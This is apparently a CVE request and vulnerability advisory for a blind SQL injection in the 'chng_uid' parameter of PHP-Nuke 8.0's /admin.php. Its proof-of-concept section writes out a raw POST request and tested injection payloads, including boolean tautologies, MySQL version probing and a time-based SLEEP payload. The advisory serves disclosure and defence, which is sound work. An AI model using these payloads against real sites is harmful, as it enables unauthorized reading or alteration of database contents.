Subject: CVE Request: PHP-Nuke 8.x <= "chng_uid" Blind SQL Injection Vulnerability

PHP-Nuke 8.x <= Blind SQL Injection Vulnerability

1. OVERVIEW

The administration backend of PHP-Nuke 8.x is vulnerable to Blind SQL Injection.

2. BACKGROUND

PHP-Nuke is a Web Portal System or content management system. The goal
of PHP-Nuke is to have an automated web site to distribute news and

comments, moderation system, Referrers page to know who link us,
sections manager, customizable HTML blocks, user and authors edit, an
integrated Banners Ads system, search engine, backend/headlines
generation (RSS/RDF format), and many, many more friendly functions.

3. VULNERABILITY DESCRIPTION

The "chng_uid" parameter is not properly sanitized upon submission to
the /admin.php which leads to Blind SQL Injection vulnerability.
This allows an attacker to inject or manipulate SQL queries in the
back-end database, allowing for the manipulation or disclosure of
arbitrary data.

4. VERSIONS AFFECTED

8.0 and lower

Tested version: 8.0
The paid versions, 8.1 and 9.0, of php-Nuke may be vulnerable as well.

5. PROOF-OF-CONCEPT/EXPLOIT

=> /admin.php

POST /admin.php HTTP/1.1
Referer: <http://localhost/admin.php?op=mod_users>
Content-Type: application/x-www-form-urlencoded
Host: localhost

chng_uid=[BLIND_SQL_INJECTION]+&op=modifyUser

Tested Payloads:
' or 1=1-- [TRUE]
' or 1=2-- [FALSE]
' or substring(@@version,1,1)=5--  [TRUE if mySQL version is 5.x]
' or substring(@@version,1,1)=4--  [FALSE if mySQL version is 5.x]
' or SLEEP(15)=0-- [sleep for 15 seconds]

Successful response (True) returns the user update form page.
